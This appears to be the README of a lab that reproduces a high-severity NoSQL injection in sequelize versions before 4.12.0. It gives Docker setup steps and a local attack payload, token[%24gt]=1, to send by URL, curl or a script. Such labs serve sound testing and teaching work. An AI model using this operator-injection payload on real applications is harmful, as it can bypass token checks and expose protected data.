# NoSQL Injection @ sequelize
- module : sequelize
- version : <4.12.0
- severity: high
- type: nosql-injection

# Installation

`docker-compose up --build`

# Lunch Attack

- ### Browser [open the browser and enter the following url]
    http://localhost:8000?token[%24gt]=1

## OR

- ### Curl [open the terminal and run the following]
    curl http://localhost:8000?token[%24gt]=1

## OR

- ### Bash [open the terminal in the root dir of this app and run the following]
    bash attack.sh